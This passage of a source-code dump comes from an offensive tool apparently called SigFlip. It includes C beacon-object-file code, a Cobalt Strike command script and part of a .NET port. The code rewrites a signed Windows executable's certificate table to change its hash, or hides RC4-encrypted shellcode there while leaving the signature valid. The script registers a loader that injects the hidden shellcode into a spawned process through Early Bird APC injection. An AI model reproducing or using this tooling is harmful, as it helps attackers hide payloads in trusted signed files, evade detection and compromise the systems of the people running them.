	MSVCRT$mbstowcs(_wStr, _Str, MSVCRT$strlen(_Str) + 1);
}

BOOL Sha1(BYTE* peblob, char* sha1Buf, DWORD dwBufferLen)
{
	HCRYPTPROV hProv = 0;
	HCRYPTHASH hHash = 0;
	BYTE rgbHash[SHA1LEN];
	DWORD cbHash = 0;

	if (!ADVAPI32$CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)){
		return FALSE;
	}

	if (!ADVAPI32$CryptCreateHash(hProv, CALG_SHA1, 0, 0, &hHash)) {
		ADVAPI32$CryptReleaseContext(hProv, 0);
		return FALSE;
	}

	if (!ADVAPI32$CryptHashData(hHash, peblob, dwBufferLen, 0)){	
		ADVAPI32$CryptReleaseContext(hProv, 0);
		ADVAPI32$CryptDestroyHash(hHash);
		return FALSE;
	}


	cbHash = SHA1LEN;
	if (ADVAPI32$CryptGetHashParam(hHash, HP_HASHVAL, rgbHash, &cbHash, 0)) {
		for (DWORD i = 0; i < cbHash; i++) {
			MSVCRT$sprintf( sha1Buf + (i * 2), "%02x", rgbHash[i]);
		}

	}
	else {
		return FALSE;
	}
	 
	ADVAPI32$CryptDestroyHash(hHash);
	ADVAPI32$CryptReleaseContext(hProv, 0);

	return TRUE;
}

DWORD VerifyPESignature(PCWSTR FileName, HANDLE FileHandle)
{
	DWORD Error = ERROR_SUCCESS;
	BOOL WintrustCalled = FALSE;
	GUID GenericActionId = WINTRUST_ACTION_GENERIC_VERIFY_V2;
	WINTRUST_DATA WintrustData = {};
	WINTRUST_FILE_INFO FileInfo = {};

	// Setup data structures for calling WinVerifyTrust 
	WintrustData.cbStruct = sizeof(WINTRUST_DATA);
	WintrustData.dwStateAction = WTD_STATEACTION_VERIFY;
	WintrustData.dwUIChoice = WTD_UI_NONE;
	WintrustData.fdwRevocationChecks = WTD_REVOKE_NONE;
	WintrustData.dwUnionChoice = WTD_CHOICE_FILE;

	FileInfo.cbStruct = sizeof(FileInfo);
	FileInfo.hFile = FileHandle;
	FileInfo.pcwszFilePath = FileName;
	WintrustData.pFile = &FileInfo;


	Error = WINTRUST$WinVerifyTrust(NULL, &GenericActionId, &WintrustData);
	WintrustCalled = TRUE;
	if (Error != ERROR_SUCCESS)
	{
		goto Cleanup;
	}

Cleanup:

	// Call WinVerifyTrust with WTD_STATEACTION_CLOSE to free memory allocated by WinVerifyTrust 
	if (WintrustCalled != FALSE)
	{
		WintrustData.dwStateAction = WTD_STATEACTION_CLOSE;
		WINTRUST$WinVerifyTrust(NULL, &GenericActionId, &WintrustData);
	}

	return Error;
}


```

`Bof/sigflip.c`:

```c
#include "common.h"
#include "beacon.h"
#include "helpers.c"


#define KEY_LEN 8

void go(char* args, int length) {

	datap parser;
	char* _fPath = NULL;
	char* _oPath = NULL;
	char* _data;
	DWORD opt;
	SIZE_T _dataSize;
	DWORD _keySize = 0;
	CHAR* _key = NULL;

	BeaconDataParse(&parser, args, length);

	opt = BeaconDataInt(&parser);
	BOOL BIT_FLIP = opt == 0 ? FALSE : TRUE;

	_fPath = BeaconDataExtract(&parser, NULL);
    	_oPath = BeaconDataExtract(&parser, NULL);


	if(!BIT_FLIP){
		_key = BeaconDataExtract(&parser, NULL);
		_keySize = MSVCRT$strlen(_key);
		_dataSize = BeaconDataLength(&parser);
		_data = BeaconDataExtract(&parser, NULL);
	}

	if (checkConfig()) {
		print("[!]: Endpoint hardened against authenticode signature padding, i.e this won't work %s");
		goto _Exit;
	}
	


	DWORD _CertTableRVA = 0;
	SIZE_T _CertTableSize = 0;
	LPWIN_CERTIFICATE _wCert ;
	unsigned checksum = 0;
	FILE* _outFile = NULL;
	SIZE_T _writtenBytes = 0;
	CHAR* _encryptedData = NULL;
	CHAR* _rpadding = NULL;
	DWORD _fSize = 0;
	VOID* _peBlob = NULL;
	DWORD  _bytesRead = 0;
	HANDLE _fHandle = INVALID_HANDLE_VALUE;
	HANDLE _oHandle = INVALID_HANDLE_VALUE;
	DWORD _extraPaddingCount = 0;
	CHAR* _extraPadding = NULL;
	DWORD _DT_SecEntry_Offset = 0;
	CHAR* _sha1Hash = NULL;
	LPWSTR _fwPath = NULL;
	LPWSTR _owPath = NULL;

	//Fix - Write Permission issue leads to beacon crash
	_oHandle = KERNEL32$CreateFileA(_oPath, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if (_oHandle == INVALID_HANDLE_VALUE) {
		print("[!]: Cannot Write to specific path - Write Permissions ? Change output path");
		goto _Exit;
	}

	KERNEL32$CloseHandle(_oHandle);
		
	char* _fName = (char*)MSVCRT$malloc(MSVCRT$strlen(_fPath) + 1);
	_fName = getFName(_fPath, _fName);

	char* _oName = (char*)MSVCRT$malloc(MSVCRT$strlen(_oPath) + 1);
	_oName = getFName(_oPath, _oName);


	print("[*]:Loading/Parsing PE File '%s'", _fName);
	_fHandle = KERNEL32$CreateFileA(_fPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (_fHandle == INVALID_HANDLE_VALUE) {
		print("[!]: Could not read file %s", _fName);
		goto _Exit;
	}

	//Verifying PE file signature
	toMultiByte(MSVCRT$strlen(_fPath), _fPath, _fwPath);
	if (VerifyPESignature(_fwPath, _fHandle) == 0) {
		print("[*]:PE File '%s' is SIGNED", _fName);
	}
	else {
		print("[*]:PE File '%s' is NOT SIGNED", _fName);
	}
	
	_fSize = KERNEL32$GetFileSize(_fHandle, NULL);
	_rpadding = (char*) MSVCRT$malloc(sizeof(char) * (KEY_LEN + 1));
	genRandomBytes(KEY_LEN , _rpadding);
	if(BIT_FLIP) _fSize += MSVCRT$strlen(_rpadding);
	_peBlob = MSVCRT$malloc(_fSize);

	KERNEL32$ReadFile(_fHandle, _peBlob, _fSize, &_bytesRead, NULL);

	if (_bytesRead == 0) {
		print("[!]: Could not read file %s", _fName);
		goto _Exit;
	}

	PIMAGE_DOS_HEADER _dosHeader = (PIMAGE_DOS_HEADER)_peBlob;

	if (_dosHeader->e_magic != 0x5a4d) {
		print("'%s' is not a valid PE file", _fName);
		goto _Exit;
	}
	
	//Compute Sha1 hash
	_sha1Hash = (char*) MSVCRT$malloc(((SHA1LEN * 2) + 1) * sizeof(char));
	if (Sha1((BYTE*)_peBlob, _sha1Hash, KERNEL32$GetFileSize(_fHandle, NULL))) {
		print("[+]:PE '%s' SHA1 Hash: %s", _fName, _sha1Hash);
	}
	else {
		print("[!]:Could not compute PE '%s' SHA1 Hash\n", _fName);
		MSVCRT$free(_sha1Hash);
	}

	
	PIMAGE_NT_HEADERS _ntHeader = (PIMAGE_NT_HEADERS)((BYTE*)_peBlob + _dosHeader->e_lfanew);
	IMAGE_OPTIONAL_HEADER _optHeader = (IMAGE_OPTIONAL_HEADER)_ntHeader->OptionalHeader;
	
	//Security entry seems to be located at the 7th offset (Data_Dir) for For x64 PE files, and the 5th offset for x86 PE files. just a quick workaround to make the script work for different PE archs.
	if (IsWow64(KERNEL32$GetCurrentProcess())) {
		if (_optHeader.Magic == 0x20B) {
			_DT_SecEntry_Offset = 2;
		}
	}else{
		if (_optHeader.Magic == 0x10B) {
			_DT_SecEntry_Offset = -2;
		}
	}

	_CertTableRVA = _optHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY + _DT_SecEntry_Offset].VirtualAddress;
	_CertTableSize = _optHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY + _DT_SecEntry_Offset].Size;
	_wCert = (LPWIN_CERTIFICATE)((BYTE*)_peBlob + _CertTableRVA);

	//Bit Flip and Save file to disk
	if (BIT_FLIP) {

		print("[+]:Bit Flipping PE File %s and saving it to %s", _fName, _oName);

		//Add a random set of bytes as padding.
		print("[+]:Padding '%s' with %s ", _fName, _rpadding);
		MSVCRT$memcpy((((BYTE*)_peBlob + _CertTableRVA) + _wCert->dwLength), _rpadding, MSVCRT$strlen(_rpadding));

		//update dwLength and Cert Table Entry Size.
		print("[+]:Updating OPT Header Fields/Entries ");
		_wCert->dwLength += MSVCRT$strlen(_rpadding);
		_ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY + _DT_SecEntry_Offset].Size += MSVCRT$strlen(_rpadding);;

		//update checksum
		print("[+]:Calculating/Updating the new OPTHeader checksum");
		checksum = PEChecksum(_peBlob, _fSize);
		_ntHeader->OptionalHeader.CheckSum = checksum;

		//re-computing the new sha1 hash
		_sha1Hash = (char*)MSVCRT$malloc(((SHA1LEN * 2) + 1) * sizeof(char));
		if (Sha1((BYTE*)_peBlob, _sha1Hash, _fSize)) {
			print("[+]: New PE '%s' SHA1 Hash: %s", _oName, _sha1Hash);
		}
		else {
			print("[!]:Could not compute PE '%s' SHA1 Hash\n", _oName);
			MSVCRT$free(_sha1Hash);
		}

		//save patched PE to disk
		print("[+]:Saving Bit-flipped PE to '%s'", _oName);
		_outFile = MSVCRT$fopen(_oPath, "wb");
		_writtenBytes = MSVCRT$fwrite(_peBlob, _fSize, 1, _outFile);
		MSVCRT$fclose(_outFile);

	}

	//Inject Data and Save file to disk
	else if (!BIT_FLIP) {

		print("[+]:Injecting Data of size %d to PE File '%s'", _dataSize, _fName);

		//RC4 encrypt and Tag
		print("[+]:Encrypting Data of size %d", _dataSize);
		_encryptedData = (CHAR*)MSVCRT$malloc(_dataSize + 8);
		if (_keySize == 0) {
			_key = (CHAR*)MSVCRT$malloc(sizeof(char) * 16);
			genKey(_key);
			_keySize = 15;
		}	
		MSVCRT$memcpy(_encryptedData, "\xFE\xED\xFA\xCE\xFE\xED\xFA\xCE", 8);
		crypt((unsigned char*)_data, _dataSize, _key, _keySize, (unsigned char*)_encryptedData + 8);
		_dataSize += 8;


		//Adjust extra padding
		if ((_fSize + _dataSize) % 8 != 0) {
			while ((_fSize + _dataSize + _extraPaddingCount) % 8 != 0) {
				_extraPaddingCount++;
			}
			_extraPadding = (char*)MSVCRT$malloc(_extraPaddingCount);
			MSVCRT$sprintf(_extraPadding, "%0*d", _extraPaddingCount, 0);
			_encryptedData = (CHAR*) MSVCRT$realloc(_encryptedData, (_dataSize + _extraPaddingCount));
			MSVCRT$memcpy(_encryptedData + _dataSize, _extraPadding, _extraPaddingCount);
			_dataSize += _extraPaddingCount;
		}

		//Increasing buffer size
		_peBlob = MSVCRT$realloc(_peBlob, (_fSize + _dataSize));

		//Re-initialize structures (_peBlob was reallocated)
		_dosHeader = NULL ;
		_ntHeader = NULL ;
		_wCert =  NULL ;
		_dosHeader = (PIMAGE_DOS_HEADER)_peBlob;
		_ntHeader = (PIMAGE_NT_HEADERS)((BYTE*)_peBlob + _dosHeader->e_lfanew);
		_optHeader = (IMAGE_OPTIONAL_HEADER)_ntHeader->OptionalHeader;
		_CertTableRVA = _optHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY + _DT_SecEntry_Offset].VirtualAddress;
		_CertTableSize = _optHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY + _DT_SecEntry_Offset].Size;
		_wCert = (LPWIN_CERTIFICATE)((BYTE*)_peBlob + _CertTableRVA);

		//Add padding based on data read from _sPath
		MSVCRT$memcpy((((BYTE*)_peBlob + _CertTableRVA) + _wCert->dwLength), _encryptedData, _dataSize);

		//update dwLength and Cert Table Entry Size.
		print("[+]:Updating OPT Header Fields/Entries ");
		_wCert->dwLength += _dataSize;
		_ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY + _DT_SecEntry_Offset].Size += _dataSize;

		//update checksum
		print("[+]:Calculating/Updating the new OPTHeader checksum");
		checksum = PEChecksum(_peBlob, _fSize + _dataSize);
		
		_ntHeader->OptionalHeader.CheckSum = PEChecksum(_peBlob, _fSize + _dataSize);

		print("[+]:Encrypted Data Size: %d", _dataSize);
		print("[+]:Encryption Key: %s", _key);
		print("[+]:Extra Padding: %d", _extraPaddingCount);


		//re-computing the new sha1 hash
		_sha1Hash = (char*)MSVCRT$malloc(((SHA1LEN * 2) + 1) * sizeof(char));
		if (Sha1((BYTE*)_peBlob, _sha1Hash, (_fSize + _dataSize))) {
			print("[+]:New PE '%s' SHA1 Hash: %s", _oName, _sha1Hash);
		}
		else {
			print("[!]:Could not compute PE '%s' SHA1 Hash\n", _oName);
			MSVCRT$free(_sha1Hash);
		}

		//save patched PE to disk
		print("[+]:Saving Modified PE file '%s' to '%s'", _fName, _oName);	
		_outFile = MSVCRT$fopen(_oPath, "wb");
		_writtenBytes = MSVCRT$fwrite(_peBlob, (_fSize + _dataSize), 1, _outFile);
		MSVCRT$fclose(_outFile);
	}
	
	//verify modified PE file signature
	_oHandle = KERNEL32$CreateFileA(_oPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (_oHandle == INVALID_HANDLE_VALUE) {
		print("[!]: Could not read file %s\n", _oName);
		goto _Exit;
	}
	toMultiByte(MSVCRT$strlen(_oPath), _oPath, _owPath);
	if (VerifyPESignature(_owPath, _oHandle) == 0) {
		print("[*]:Modified PE '%s' is SIGNED\n", _oName);
	}
	else {
		print("[!]:Modified PE '%s' is NOT SIGNED\n", _oName);
	}
	
	print("Done.");
	
	goto _Exit;

	_Exit:
		if (_fName) MSVCRT$free(_fName);
		if (_oName) MSVCRT$free(_oName);
		if (_rpadding) MSVCRT$free(_rpadding);
		if (_encryptedData) MSVCRT$free(_encryptedData);
		if (_key) MSVCRT$free(_key);
		if (_peBlob) MSVCRT$free(_peBlob);
		if (_fwPath) MSVCRT$free(_fwPath);
		if (_owPath) MSVCRT$free(_owPath);
		if (_sha1Hash) MSVCRT$free(_sha1Hash);
		if (_extraPadding) MSVCRT$free(_extraPadding);
		if (_fHandle) KERNEL32$CloseHandle(_fHandle);
		if (_oHandle) KERNEL32$CloseHandle(_oHandle);

}

```

`Bof/sigflip.cna`:

```cna
beacon_command_register(
"SigFlip", 
"Change a PE file (DLL, EXE, SYS, OCX ..etc) hash without breaking the signature or the validity of the certificate", 
"\nUsage: SigFlip <PE_FILE_PATH> <OUTPUT_PE_FILE_PATH (with extension)>\n\nChange a PE file (DLL, EXE, SYS, OCX ..etc) hash without breaking the signature or the validity of the certificate");

beacon_command_register(
"SigInject", 
"Encrypts and Injects shellcode into a PE file's [WIN_CERTIFICATE] certificate table, encryption key is printed out for usage with a basic C/C# loader
. plus keeps the signature and certificate validity intact", 
"\nUsage: SigInject <PE_FILE_PATH> <OUTPUT_PE_FILE_PATH (with extension)> <ENCRYPTION_KEY> <SHELLCODE_FILE>\n\nEncrypts and Injects shellcode into a PE file's [WIN_CERTIFICATE] certificate table, encryption key is printed out for usage with a basic C/C# loader. plus keeps the signature and certificate validity intact.");

beacon_command_register(
"SigLoader", "", 
"\nLoad encrypted shellcode from PE files created by SigInject, then use Early Bird queueuserapc to spawn/inject sc into a sacrificial process\n\nUsage: SigLoader <PE_FILE_PATH_WITH_SH> <DECRYPTION_KEY> <SPAWNTO_PROCESS_PATH> <PARENT_PROCESS_ID>\n\n-> shellcode injection logic can be customized or replaced with any other code injection technique of choice.");

alias SigFlip {

	btask($1, "Sig flipping...");
	
    local('$bofHandle $bofData $arguments $PEPath $outPath');
	
	$barch  = barch($1);
	
	$bofHandle = openf(script_resource("sigflip. $+ $barch $+ .o"));
	$bofData = readb($bofHandle, -1);
	closef($bofHandle);

    $PEPath = $2;
    $outPath = $3;

    if ($PEPath eq "" || $outPath eq "") {
      berror($1, "Missing arguments, check usage/help\n");
      return;
    }

	$arguments = bof_pack($1,"izz",1,$PEPath,$outPath);
	
	btask($1, "Sig flipping $2 and saving it to $3");
	beacon_inline_execute($1, $bofData, "go", $arguments);
}

alias SigInject {

	btask($1, "Injecting Shellcode...");


	local('$bofHandle $bofData $arguments $PEPath $outPath $encKey $scBlob');
	
	$barch = barch($1);
	
	$bofHandle = openf(script_resource("sigflip. $+ $barch $+ .o"));
	$bofData = readb($bofHandle, -1);
	closef($bofHandle);

    $PEPath = $2;
    $outPath = $3;
	$encKey = $4;

    if ($PEPath eq "" || $outPath eq "") {
      berror($1, "Missing arguments, check usage/help\n");
      return;
    }


	$scHandle = openf($5);
	$scBlob = readb($scHandle, -1);
	closef($scHandle);

    if(int(strlen($scBlob)) == 0){
      berror($1, "Could not read the shellcode file, check the path & if the file exists.\n");
      return;
    }

	btask($1, "Encrypting/Injecting Shellcode $5 into $2 ...");
	btask($1, "Saving result to $3");

	$arguments = bof_pack($1, "izzzb", 0, $PEPath, $outPath, $encKey, $scBlob);
	
	beacon_inline_execute($1, $bofData, "go", $arguments);
}

alias SigLoader {

	btask($1, "Loading Shellcode...");


	local('$bofHandle $bofData $arguments $PEPath $encKey $spawntProcess $PPID');
	
	$barch = barch($1);
	
	$bofHandle = openf(script_resource("sigloader. $+ $barch $+ .o"));
	$bofData = readb($bofHandle, -1);
	closef($bofHandle);

    $PEPath = $2;
    $encKey = $3;
	$spawntProcess = $4;
	$PPID = $5;

    if ($PEPath eq "" || $encKey eq "" || $PPID eq "" || $spawntProcess eq "") {
      berror($1, "Missing arguments, check usage/help\n");
      return;
    }


	btask($1, "Decrypting/Injecting Shellcode into process with PPID $4 ...");

	$arguments = bof_pack($1, "zzzi", $PEPath, $encKey, $spawntProcess, $PPID);
	
	beacon_inline_execute($1, $bofData, "go", $arguments);
}
```

`DotNet/SigFlip/SigFlip.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio 15
VisualStudioVersion = 15.0.28010.2003
MinimumVisualStudioVersion = 10.0.40219.1
Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "SigFlip", "SigFlip\SigFlip.csproj", "{DDFDD691-DAA2-41FA-8E2C-F85C2A54614D}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|Any CPU = Debug|Any CPU
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|Any CPU = Release|Any CPU
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{DDFDD691-DAA2-41FA-8E2C-F85C2A54614D}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{DDFDD691-DAA2-41FA-8E2C-F85C2A54614D}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{DDFDD691-DAA2-41FA-8E2C-F85C2A54614D}.Debug|x64.ActiveCfg = Debug|x64
		{DDFDD691-DAA2-41FA-8E2C-F85C2A54614D}.Debug|x64.Build.0 = Debug|x64
		{DDFDD691-DAA2-41FA-8E2C-F85C2A54614D}.Debug|x86.ActiveCfg = Debug|x86
		{DDFDD691-DAA2-41FA-8E2C-F85C2A54614D}.Debug|x86.Build.0 = Debug|x86
		{DDFDD691-DAA2-41FA-8E2C-F85C2A54614D}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{DDFDD691-DAA2-41FA-8E2C-F85C2A54614D}.Release|Any CPU.Build.0 = Release|Any CPU
		{DDFDD691-DAA2-41FA-8E2C-F85C2A54614D}.Release|x64.ActiveCfg = Release|x64
		{DDFDD691-DAA2-41FA-8E2C-F85C2A54614D}.Release|x64.Build.0 = Release|x64
		{DDFDD691-DAA2-41FA-8E2C-F85C2A54614D}.Release|x86.ActiveCfg = Release|x86
		{DDFDD691-DAA2-41FA-8E2C-F85C2A54614D}.Release|x86.Build.0 = Release|x86
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {5DD3A6B4-4F96-4071-960F-ACD177E259C7}
	EndGlobalSection
EndGlobal

```

`DotNet/SigFlip/SigFlip/App.config`:

```config
<?xml version="1.0" encoding="utf-8" ?>
<configuration>
    <startup> 
        <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.6.1" />
    </startup>
</configuration>
```

`DotNet/SigFlip/SigFlip/PE.cs`:

```cs
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using static SigFlip.PEHeaders;

namespace SigFlip
{
    public class PE
    {
  
        #region Fields

        public IMAGE_DOS_HEADER dosHeader;
        public IMAGE_FILE_HEADER fileHeader;
        public IMAGE_OPTIONAL_HEADER32 optionalHeader32;
        public IMAGE_OPTIONAL_HEADER64 optionalHeader64;
        public WIN_CERTIFICATE winCert;

        #endregion Fields

        public PE(string filePath)
        {
            using (FileStream stream = new FileStream(filePath, System.IO.FileMode.Open, System.IO.FileAccess.Read))
            {
                BinaryReader reader = new BinaryReader(stream);
                dosHeader = Utils.FromBinaryReader<IMAGE_DOS_HEADER>(reader);
                stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);
                UInt32 ntHeadersSignature = reader.ReadUInt32();
                fileHeader = Utils.FromBinaryReader<IMAGE_FILE_HEADER>(reader);

                if (Utils.Is32Bit(this.fileHeader.Characteristics))
                {
                    optionalHeader32 = Utils.FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
                    stream.Seek(optionalHeader32.CertificateTable.VirtualAddress, SeekOrigin.Begin);
                    winCert = Utils.FromBinaryReader<WIN_CERTIFICATE>(reader);
                }
                else
                {
                    optionalHeader64 = Utils.FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
                    stream.Seek(optionalHeader64.CertificateTable.VirtualAddress, SeekOrigin.Begin);
                    winCert = Utils.FromBinaryReader<WIN_CERTIFICATE>(reader);
                }

               

            }
        }


    }
}

```

`DotNet/SigFlip/SigFlip/PEHeaders.cs`:

```cs
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;


namespace SigFlip
{
    public class PEHeaders
    {
        #region PE File Headers Structs
        public struct IMAGE_DOS_HEADER
        {
            public UInt16 e_magic;
            public UInt16 e_cblp;
            public UInt16 e_cp;
            public UInt16 e_crlc;
            public UInt16 e_cparhdr;
            public UInt16 e_minalloc;
            public UInt16 e_maxalloc;
            public UInt16 e_ss;
            public UInt16 e_sp;
            public UInt16 e_csum;
            public UInt16 e_ip;
            public UInt16 e_cs;
            public UInt16 e_lfarlc;
            public UInt16 e_ovno;
            public UInt16 e_res_0;
            public UInt16 e_res_1;
            public UInt16 e_res_2;
            public UInt16 e_res_3;
            public UInt16 e_oemid;
            public UInt16 e_oeminfo;
            public UInt16 e_res2_0;
            public UInt16 e_res2_1;
            public UInt16 e_res2_2;
            public UInt16 e_res2_3;
            public UInt16 e_res2_4;
            public UInt16 e_res2_5;
            public UInt16 e_res2_6;
            public UInt16 e_res2_7;
            public UInt16 e_res2_8;
            public UInt16 e_res2_9;
            public UInt32 e_lfanew;
        }
        [StructLayout(LayoutKind.Sequential)]

        public struct IMAGE_DATA_DIRECTORY
        {
            public UInt32 VirtualAddress;
            public UInt32 Size;
        }
        [StructLayout(LayoutKind.Sequential, Pack = 1)]

        public struct IMAGE_OPTIONAL_HEADER32
        {
            public UInt16 Magic;
            public Byte MajorLinkerVersion;
            public Byte MinorLinkerVersion;
            public UInt32 SizeOfCode;
            public UInt32 SizeOfInitializedData;
            public UInt32 SizeOfUninitializedData;
            public UInt32 AddressOfEntryPoint;
            public UInt32 BaseOfCode;
            public UInt32 BaseOfData;
            public UInt32 ImageBase;
            public UInt32 SectionAlignment;
            public UInt32 FileAlignment;
            public UInt16 MajorOperatingSystemVersion;
            public UInt16 MinorOperatingSystemVersion;
            public UInt16 MajorImageVersion;
            public UInt16 MinorImageVersion;
            public UInt16 MajorSubsystemVersion;
            public UInt16 MinorSubsystemVersion;
            public UInt32 Win32VersionValue;
            public UInt32 SizeOfImage;
            public UInt32 SizeOfHeaders;
            public UInt32 CheckSum;
            public UInt16 Subsystem;
            public UInt16 DllCharacteristics;
            public UInt32 SizeOfStackReserve;
            public UInt32 SizeOfStackCommit;
            public UInt32 SizeOfHeapReserve;
            public UInt32 SizeOfHeapCommit;
            public UInt32 LoaderFlags;
            public UInt32 NumberOfRvaAndSizes;
            public IMAGE_DATA_DIRECTORY ExportTable;
            public IMAGE_DATA_DIRECTORY ImportTable;
            public IMAGE_DATA_DIRECTORY ResourceTable;
            public IMAGE_DATA_DIRECTORY ExceptionTable;
            public IMAGE_DATA_DIRECTORY CertificateTable;
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;
            public IMAGE_DATA_DIRECTORY Debug;
            public IMAGE_DATA_DIRECTORY Architecture;
            public IMAGE_DATA_DIRECTORY GlobalPtr;
            public IMAGE_DATA_DIRECTORY TLSTable;
            public IMAGE_DATA_DIRECTORY LoadConfigTable;
            public IMAGE_DATA_DIRECTORY BoundImport;
            public IMAGE_DATA_DIRECTORY IAT;
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
            public IMAGE_DATA_DIRECTORY Reserved;
        }
        [StructLayout(LayoutKind.Sequential, Pack = 1)]

        public struct IMAGE_OPTIONAL_HEADER64
        {
            public UInt16 Magic;
            public Byte MajorLinkerVersion;
            public Byte MinorLinkerVersion;
            public UInt32 SizeOfCode;
            public UInt32 SizeOfInitializedData;
            public UInt32 SizeOfUninitializedData;
            public UInt32 AddressOfEntryPoint;
            public UInt32 BaseOfCode;
            public UInt64 ImageBase;
            public UInt32 SectionAlignment;
            public UInt32 FileAlignment;
            public UInt16 MajorOperatingSystemVersion;
            public UInt16 MinorOperatingSystemVersion;
            public UInt16 MajorImageVersion;
            public UInt16 MinorImageVersion;
            public UInt16 MajorSubsystemVersion;
            public UInt16 MinorSubsystemVersion;
            public UInt32 Win32VersionValue;
            public UInt32 SizeOfImage;
            public UInt32 SizeOfHeaders;
            public UInt32 CheckSum;
            public UInt16 Subsystem;
            public UInt16 DllCharacteristics;
            public UInt64 SizeOfStackReserve;
            public UInt64 SizeOfStackCommit;
            public UInt64 SizeOfHeapReserve;
            public UInt64 SizeOfHeapCommit;
            public UInt32 LoaderFlags;
            public UInt32 NumberOfRvaAndSizes;
            public IMAGE_DATA_DIRECTORY ExportTable;
            public IMAGE_DATA_DIRECTORY ImportTable;
            public IMAGE_DATA_DIRECTORY ResourceTable;
            public IMAGE_DATA_DIRECTORY ExceptionTable;
            public IMAGE_DATA_DIRECTORY CertificateTable;
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;
            public IMAGE_DATA_DIRECTORY Debug;
            public IMAGE_DATA_DIRECTORY Architecture;
            public IMAGE_DATA_DIRECTORY GlobalPtr;
            public IMAGE_DATA_DIRECTORY TLSTable;
            public IMAGE_DATA_DIRECTORY LoadConfigTable;
            public IMAGE_DATA_DIRECTORY BoundImport;
            public IMAGE_DATA_DIRECTORY IAT;
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
            public IMAGE_DATA_DIRECTORY Reserved;
        }
        [StructLayout(LayoutKind.Sequential, Pack = 1)]

        public struct IMAGE_FILE_HEADER
        {
            public UInt16 Machine;
            public UInt16 NumberOfSections;
            public UInt32 TimeDateStamp;
            public UInt32 PointerToSymbolTable;
            public UInt32 NumberOfSymbols;
            public UInt16 SizeOfOptionalHeader;
            public UInt16 Characteristics;
        }

        public enum WIN_CERT_REVISION : ushort
        {
            REVISION_1_0 = 0x0100,
            REVISION_2_0 = 0x0200,
        }

        public enum WIN_CERT_TYPE : ushort
        {
            X509 = 1,
            PKCS_SIGNED_DATA = 2,
            RESERVED_1 = 3,
            TS_STACK_SIGNED = 4,
            PKCS1_SIGN = 9,
        }
        [StructLayout(LayoutKind.Sequential)]

        public struct WIN_CERTIFICATE
        {
            public uint dwLength;
            public WIN_CERT_REVISION wRevision;
            public WIN_CERT_TYPE wCertificateType;
            //public Byte bCertificate;
        }

        #endregion PE File Headers Structs

    }
}

```

`DotNet/SigFlip/SigFlip/Program.cs`:

```cs
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using static SigFlip.PE;
using static SigFlip.PEHeaders;

namespace SigFlip
{
    class Program
    {
       enum MODE
        {
            BIT_FLIP,
            BIT_INJECT
        }

        public static uint CERT_TABLE_RVA_OFFSET = 0x98;
        public static int RANDOM_BYTES_SIZE = 8;
        public static string _pePath = "";
        public static string _outPath = "./outPE";
        public static string _dataPath = "";
        public static string _encKey = "";
        public static byte[] _tag = { 0xfe, 0xed, 0xfa, 0xce, 0xfe, 0xed, 0xfa, 0xce };
        public static void Main(string[] args)
        {

            #region Arguments parsing
            ArgumentParser _parser = new ArgumentParser(args);

            if (args.Length <= 0 || _parser.GetOrDefault("h", "help") == "true")
            {
                Help();
            }

            MODE _mode = MODE.BIT_FLIP;

            if (_parser.GetOrDefault("b", "null") != "null"){
                _mode = MODE.BIT_FLIP;
                _pePath = _parser.GetOrDefault("b", "null");
                _outPath = _parser.GetOrDefault("o", "null") == "null" ? "./outPE" : _parser.GetOrDefault("o", "null");
                if (_pePath == "null") Help();

            } else if (_parser.GetOrDefault("i", "null") != "null") {
                _mode = MODE.BIT_INJECT;
                _pePath = _parser.GetOrDefault("i", "null");
                _outPath = _parser.GetOrDefault("o", "null") == "null" ? "./outPE" : _parser.GetOrDefault("o", "null");
                _dataPath = _parser.GetOrDefault("s", "null");
                _encKey = _parser.GetOrDefault("e", "null");
                if (_pePath == "null" || _dataPath == "null" || _encKey == "null") Help();
                if (_dataPath != "null")
                {
                    if (!File.Exists(_dataPath)) Help();
                }
            }
            else {
                Help();
            }

            if (!File.Exists(_pePath)) Help();

            #endregion Arguments parsing

            Console.WriteLine();
            //Check configuration
            if (Utils.checkConfig()) {
                Console.WriteLine("[!]:Endpoint hardened against authenticode signature padding, i.e this won't work");
                Environment.Exit(0);
            }

